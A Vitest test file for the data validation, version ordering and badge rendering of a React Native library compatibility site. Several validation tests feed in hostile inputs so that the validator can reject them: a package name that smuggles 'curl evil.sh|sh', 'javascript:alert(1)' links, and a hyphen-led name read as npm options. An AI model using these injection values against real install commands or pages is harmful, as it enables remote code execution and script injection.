import { readdirSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { badgeSvg } from './badge';
import {
  assertFolderMatchesName,
  assertNameIsFree,
  bestLineFor,
  cellKind,
  compareLines,
  DataError,
  defaultReactNativeLine,
  formatTestedDate,
  overviewCell,
  parsePackageFile,
  parseReactNativeFile,
  verifiedRange,
  type ReactNativeLine,
} from './compat';
import { loadSiteData, RESERVED_NAMES } from './load';

function reactNativeFile(lines: Record<string, { version: string; channel: 'stable' | 'rc' }>) {
  return { schemaVersion: 1, lines };
}

const RN: ReactNativeLine[] = parseReactNativeFile(
  reactNativeFile({
    '0.81': { version: '0.81.6', channel: 'stable' },
    '0.82': { version: '0.82.1', channel: 'stable' },
    '0.83': { version: '0.83.10', channel: 'stable' },
    '0.84': { version: '0.84.0-rc.1', channel: 'rc' },
  }),
  'react-native.json',
);

// Builds a compatibility.json from one letter per React Native line: Y passes, I iOS build fails,
// A Android build fails, B both builds fail, T tests fail, and "-" leaves the cell out (queued).
function packageFile(
  rows: Record<string, { version: string; cells: string }>,
  rnLines: ReactNativeLine[] = RN,
  name = 'example',
) {
  const lines: Record<string, { version: string; results: Record<string, Record<string, unknown>> }> = {};
  for (const [line, { version, cells }] of Object.entries(rows)) {
    const results: Record<string, Record<string, unknown>> = {};
    [...cells].forEach((code, i) => {
      const rn = rnLines[i];
      if (code === '-' || !rn) return;
      results[rn.line] = {
        status: code === 'Y' ? 'compatible' : 'incompatible',
        tested: { library: version, reactNative: rn.version },
        checks: {
          buildIos: code === 'I' || code === 'B' ? 'failed' : 'passed',
          buildAndroid: code === 'A' || code === 'B' ? 'failed' : 'passed',
          tests: code === 'T' ? 'failed' : 'passed',
        },
        testedAt: '2026-09-06T02:14:09Z',
      };
    });
    lines[line] = { version, results };
  }
  return {
    schemaVersion: 1,
    package: { name, repository: 'https://github.com/example/example' } as Record<string, unknown>,
    lines,
  };
}

function parse(rows: Record<string, { version: string; cells: string }>) {
  return parsePackageFile(packageFile(rows), 'example/compatibility.json', RN);
}

// A file with one passing cell (2.1 on 0.81), for tests that break one field.
function oneCellFile() {
  const file = packageFile({ '2.1': { version: '2.1.3', cells: 'Y' } });
  const cell = file.lines['2.1']?.results['0.81'];
  if (!cell) throw new Error('fixture is missing the 0.81 cell');
  return { file, cell };
}

function rejects(file: unknown, pattern: RegExp) {
  expect(() => parsePackageFile(file, 'example/compatibility.json', RN)).toThrow(DataError);
  expect(() => parsePackageFile(file, 'example/compatibility.json', RN)).toThrow(pattern);
}

describe('compareLines', () => {
  it('orders numerically by major then minor', () => {
    const lines = ['0.100', '10.0', '0.9', '9.5', '0.99', '1.0'];
    expect([...lines].sort(compareLines)).toEqual(['0.9', '0.99', '0.100', '1.0', '9.5', '10.0']);
  });

  it('sorts React Native columns ascending and library rows descending', () => {
    const rn = parseReactNativeFile(
      reactNativeFile({
        '0.100': { version: '0.100.0', channel: 'stable' },
        '0.99': { version: '0.99.2', channel: 'stable' },
      }),
      'react-native.json',
    );
    expect(rn.map((r) => r.line)).toEqual(['0.99', '0.100']);

    const pkg = parse({
      '9.5': { version: '9.5.0', cells: 'Y' },
      '10.0': { version: '10.0.1', cells: 'Y' },
    });
    expect(pkg.lines.map((l) => l.line)).toEqual(['10.0', '9.5']);
  });
});

describe('cellKind', () => {
  const pkg = parse({ '2.1': { version: '2.1.3', cells: 'YI-' } });

  it('reads compatible and incompatible cells', () => {
    expect(cellKind(pkg, '2.1', '0.81')).toBe('yes');
    expect(cellKind(pkg, '2.1', '0.82')).toBe('no');
  });

  it('treats a missing cell as queued', () => {
    expect(cellKind(pkg, '2.1', '0.83')).toBe('queued');
    expect(cellKind(pkg, '9.9', '0.81')).toBe('queued');
  });
});

describe('bestLineFor', () => {
  const pkg = parse({
    '2.1': { version: '2.1.3', cells: 'IY--' },
    '2.0': { version: '2.0.0', cells: 'YYT-' },
  });

  it('picks the newest compatible line', () => {
    expect(bestLineFor(pkg, '0.81')?.line).toBe('2.0');
    expect(bestLineFor(pkg, '0.82')?.line).toBe('2.1');
  });

  it('returns nothing when no line is compatible', () => {
    expect(bestLineFor(pkg, '0.83')).toBeUndefined();
    expect(bestLineFor(pkg, '0.84')).toBeUndefined();
  });
});

describe('overviewCell', () => {
  const pkg = parse({
    '2.1': { version: '2.1.3', cells: 'IY--' },
    '2.0': { version: '2.0.0', cells: 'YYT-' },
  });

  it('separates the newest line, an older line, no line, and untested', () => {
    expect(overviewCell(pkg, '0.82')).toEqual({ kind: 'latest', line: '2.1' });
    expect(overviewCell(pkg, '0.81')).toEqual({ kind: 'older', line: '2.0' });
    expect(overviewCell(pkg, '0.83')).toEqual({ kind: 'no' });
    expect(overviewCell(pkg, '0.84')).toEqual({ kind: 'untested' });
  });
});

describe('defaultReactNativeLine', () => {
  it('picks the newest stable line with results, skipping release candidates', () => {
    expect(defaultReactNativeLine(RN, parse({ '1.0': { version: '1.0.0', cells: 'YYYY' } }))?.line).toBe('0.83');
  });

  it('skips a newer stable line that has no results yet', () => {
    expect(defaultReactNativeLine(RN, parse({ '1.0': { version: '1.0.0', cells: 'IY--' } }))?.line).toBe('0.82');
  });

  it('falls back to the newest stable line when the package has no stable results', () => {
    expect(defaultReactNativeLine(RN, parse({ '1.0': { version: '1.0.0', cells: '---Y' } }))?.line).toBe('0.83');
  });

  it('returns nothing when there is no stable line', () => {
    const pkg = parse({ '1.0': { version: '1.0.0', cells: 'Y' } });
    expect(defaultReactNativeLine(RN.filter((rn) => rn.channel === 'rc'), pkg)).toBeUndefined();
  });
});

describe('verifiedRange', () => {
  it('joins a contiguous run', () => {
    expect(verifiedRange(parse({ '1.0': { version: '1.0.0', cells: 'IYYY' } }), RN)).toBe('0.82 to 0.84');
  });

  it('splits non-contiguous runs, including a queued gap', () => {
    expect(verifiedRange(parse({ '1.0': { version: '1.0.0', cells: 'YYTY' } }), RN)).toBe('0.81 to 0.82, 0.84');
    expect(verifiedRange(parse({ '1.0': { version: '1.0.0', cells: 'Y-YY' } }), RN)).toBe('0.81, 0.83 to 0.84');
  });

  it('only looks at the newest line', () => {
    const pkg = parse({
      '2.0': { version: '2.0.0', cells: 'IIIY' },
      '1.0': { version: '1.0.0', cells: 'YYYY' },
    });
    expect(verifiedRange(pkg, RN)).toBe('0.84');
  });

  it('is empty when nothing is compatible', () => {
    expect(verifiedRange(parse({ '1.0': { version: '1.0.0', cells: 'IT--' } }), RN)).toBe('');
  });
});

describe('the approved design', () => {
  // The prototype's sample data, which the site's mock data was written from.
  const rnLines = parseReactNativeFile(
    reactNativeFile({
      '0.78': { version: '0.78.3', channel: 'stable' },
      '0.79': { version: '0.79.7', channel: 'stable' },
      '0.80': { version: '0.80.3', channel: 'stable' },
      '0.81': { version: '0.81.6', channel: 'stable' },
      '0.82': { version: '0.82.1', channel: 'stable' },
      '0.83': { version: '0.83.10', channel: 'stable' },
      '0.84': { version: '0.84.1', channel: 'stable' },
      '0.85': { version: '0.85.3', channel: 'stable' },
      '0.86': { version: '0.86.3', channel: 'stable' },
      '0.87': { version: '0.87.1', channel: 'stable' },
      '0.88': { version: '0.88.0-rc.3', channel: 'rc' },
    }),
    'react-native.json',
  );
  const pkg = parsePackageFile(
    packageFile(
      {
        '2.1': { version: '2.1.3', cells: 'BBBIIYYYYYY' },
        '2.0': { version: '2.0.0', cells: 'BBIYYYYYYT-' },
        '1.3': { version: '1.3.21', cells: 'YYYYYYYABB-' },
      },
      rnLines,
    ),
    'example/compatibility.json',
    rnLines,
  );

  it('opens on 0.87 with 2.1 as the answer', () => {
    expect(defaultReactNativeLine(rnLines, pkg)?.line).toBe('0.87');
    expect(bestLineFor(pkg, '0.87')?.line).toBe('2.1');
  });

  it('shows the badge range and the home row from the prototype', () => {
    expect(verifiedRange(pkg, rnLines)).toBe('0.83 to 0.88');
    expect(rnLines.map((rn) => bestLineFor(pkg, rn.line)?.line)).toEqual([
      '1.3', '1.3', '1.3', '2.0', '2.0', '2.1', '2.1', '2.1', '2.1', '2.1', '2.1',
    ]);
    expect(cellKind(pkg, '2.0', '0.88')).toBe('queued');
  });
});

describe('validation', () => {
  it('rejects a status that contradicts the checks, naming the file and field', () => {
    const { file, cell } = oneCellFile();
    cell.checks = { buildIos: 'passed', buildAndroid: 'passed', tests: 'failed' };
    rejects(file, /example\/compatibility\.json[\s\S]*lines\["2\.1"\]\.results\["0\.81"\]\.status/);
  });

  it('rejects a React Native line that is not in react-native.json', () => {
    const { file, cell } = oneCellFile();
    const results = file.lines['2.1']?.results ?? {};
    results['0.70'] = { ...cell, tested: { library: '2.1.3', reactNative: '0.70.1' } };
    rejects(file, /results\["0\.70"\]: React Native 0\.70 is not listed/);
  });

  it('rejects an unknown status value', () => {
    const { file, cell } = oneCellFile();
    cell.status = 'untested';
    rejects(file, /\.status/);
  });

  it('rejects tested versions from the wrong line', () => {
    const rnWrong = oneCellFile();
    rnWrong.cell.tested = { library: '2.1.3', reactNative: '0.82.1' };
    rejects(rnWrong.file, /results\["0\.81"\]\.tested\.reactNative: "0\.82\.1" is not a 0\.81 release/);

    const libraryWrong = oneCellFile();
    libraryWrong.cell.tested = { library: '2.0.0', reactNative: '0.81.6' };
    rejects(libraryWrong.file, /tested\.library: "2\.0\.0" is not a 2\.1 release/);
  });

  it('rejects a react-native.json version from the wrong line', () => {
    expect(() =>
      parseReactNativeFile(reactNativeFile({ '0.87': { version: '0.86.1', channel: 'stable' } }), 'react-native.json'),
    ).toThrow(/lines\["0\.87"\]\.version: "0\.86\.1" is not a 0\.87 release/);
  });

  it('rejects a folder that does not match the package name', () => {
    const pkg = parse({ '1.0': { version: '1.0.0', cells: 'Y' } });
    expect(() => assertFolderMatchesName('compatibility-data/other/compatibility.json', pkg)).toThrow(
      /package\.name: "example" does not match its folder "other"/,
    );
    expect(() => assertFolderMatchesName('compatibility-data/example/compatibility.json', pkg)).not.toThrow();
  });

  it('only accepts https links for the repository', () => {
    const { file } = oneCellFile();
    file.package.repository = 'javascript:alert(1)';
    rejects(file, /package\.repository/);
    file.package.repository = 'http://github.com/example/example';
    rejects(file, /package\.repository/);
  });

  it('only accepts https://codemagic.io links for buildUrl', () => {
    for (const url of ['javascript:alert(1)', 'http://codemagic.io/app/1', 'https://example.com/build/1']) {
      const { file, cell } = oneCellFile();
      cell.buildUrl = url;
      rejects(file, /results\["0\.81"\]\.buildUrl/);
    }
    const { file, cell } = oneCellFile();
    cell.buildUrl = 'https://codemagic.io/app/abc/build/123';
    expect(parsePackageFile(file, 'example/compatibility.json', RN).lines[0]?.results.get('0.81')?.buildUrl).toBe(
      'https://codemagic.io/app/abc/build/123',
    );
  });

  it('only accepts npm package names', () => {
    for (const name of ['x;curl evil.sh|sh;#', 'Upper', 'has space', 'a#b', 'a?b', 'a%20b', 'x'.repeat(215)]) {
      rejects(packageFile({ '1.0': { version: '1.0.0', cells: 'Y' } }, RN, name), /package\.name/);
    }
    for (const name of ['react-native-screenshot-aware', '@scope/name', 'a.b_c~d']) {
      const pkg = parsePackageFile(packageFile({ '1.0': { version: '1.0.0', cells: 'Y' } }, RN, name), 'x', RN);
      expect(pkg.name).toBe(name);
    }
  });

  it('rejects a name that starts with a hyphen', () => {
    // It would reach the install command as "npm install -rf@1.0", which npm reads as options.
    rejects(packageFile({ '1.0': { version: '1.0.0', cells: 'Y' } }, RN, '-rf'), /package\.name: must not start with a hyphen/);
  });

  it('rejects a name that collides with a page or file of the site', () => {
    for (const name of ['404.html', 'favicon.svg', 'index.html', 'badge']) {
      const file = `compatibility-data/${name}/compatibility.json`;
      const pkg = parsePackageFile(packageFile({ '1.0': { version: '1.0.0', cells: 'Y' } }, RN, name), file, RN);
      // A string argument to toThrow matches a substring of the message.
      expect(() => assertNameIsFree(file, pkg, RESERVED_NAMES)).toThrow(`Invalid compatibility data in ${file}`);
      expect(() => assertNameIsFree(file, pkg, RESERVED_NAMES)).toThrow(`package.name: "${name}" is taken`);
    }
    const ok = parse({ '1.0': { version: '1.0.0', cells: 'Y' } });
    expect(() => assertNameIsFree('x', ok, RESERVED_NAMES)).not.toThrow();
  });

  it('lists every top-level output of the site as reserved', () => {
    // What the build writes at the top level: each file in public/, and each page in src/pages/
    // as "<page>.html" (index.astro becomes index.html) or its folder name.
    const outputs = [
      ...readdirSync('public'),
      ...readdirSync('src/pages', { withFileTypes: true })
        .filter((entry) => !entry.name.startsWith('['))
        .map((entry) => (entry.isDirectory() ? entry.name : entry.name.replace(/\.astro$/, '.html'))),
    ];
    expect(outputs.length).toBeGreaterThan(0);
    for (const output of outputs) expect(RESERVED_NAMES).toContain(output);
  });

  it('caps versions at 64 characters', () => {
    const long = `1.0.0-${'a'.repeat(59)}`;
    expect(long).toHaveLength(65);
    rejects(packageFile({ '1.0': { version: long, cells: '' } }), /lines\["1\.0"\]\.version: must be at most 64 characters/);
    expect(parse({ '1.0': { version: long.slice(0, 64), cells: '' } }).lines[0]?.version).toHaveLength(64);
  });

  it('rejects unknown keys and names them', () => {
    const { file, cell } = oneCellFile();
    cell.buildURL = 'https://codemagic.io/app/1';
    rejects(file, /results\["0\.81"\]\.buildURL: is not a known field/);

    const top = { ...oneCellFile().file, mocked: true };
    rejects(top, /mocked: is not a known field/);
  });

  it('rejects line keys with leading zeros', () => {
    expect(() =>
      parseReactNativeFile(reactNativeFile({ '0.080': { version: '0.80.0', channel: 'stable' } }), 'react-native.json'),
    ).toThrow(/lines\["0\.080"\]/);
    rejects(packageFile({ '01.0': { version: '1.0.0', cells: 'Y' } }), /lines\["01\.0"\]/);
  });

  it('requires versions to be semver', () => {
    for (const version of ['2.1', '2.1.x', 'v2.1.3', '2.1.03', '2.1.3-']) {
      rejects(packageFile({ '2.1': { version, cells: '' } }), /lines\["2\.1"\]\.version/);
    }
    expect(
      parseReactNativeFile(reactNativeFile({ '0.88': { version: '0.88.0-rc.3', channel: 'rc' } }), 'rn.json')[0]
        ?.version,
    ).toBe('0.88.0-rc.3');
  });
});

describe('formatTestedDate', () => {
  it('formats in UTC as day, short month, year', () => {
    expect(formatTestedDate('2026-09-06T02:14:09Z')).toBe('6 Sep 2026');
    expect(formatTestedDate('2026-08-27T23:30:00Z')).toBe('27 Aug 2026');
  });
});

describe('badgeSvg', () => {
  it('pins text widths and describes itself', () => {
    const svg = badgeSvg('0.83 to 0.88');
    expect(svg).toContain('role="img"');
    expect(svg).toContain('<title>rn.green: RN 0.83 to 0.88</title>');
    expect(svg.match(/textLength="/g)).toHaveLength(2);
    expect(svg).toContain('#1f7a45');
  });

  it('keeps every number to one decimal place', () => {
    // "RN 0.81, 0.86" has 13 characters, and 13 * 7.2 is 93.60000000000001 in floating point.
    const svg = badgeSvg('0.81, 0.86');
    const numbers = svg.match(/="(\d+(?:\.\d+)?)"/g) ?? [];
    expect(numbers.length).toBeGreaterThan(0);
    for (const n of numbers) expect(n).toMatch(/^="\d+(\.\d)?"$/);
  });

  it('turns red when nothing is verified', () => {
    const svg = badgeSvg('');
    expect(svg).toContain('no verified versions');
    expect(svg).toContain('#6b2d3a');
  });
});

describe('data in the repository', () => {
  it('loads and validates', () => {
    expect(() => loadSiteData()).not.toThrow();
  });
});
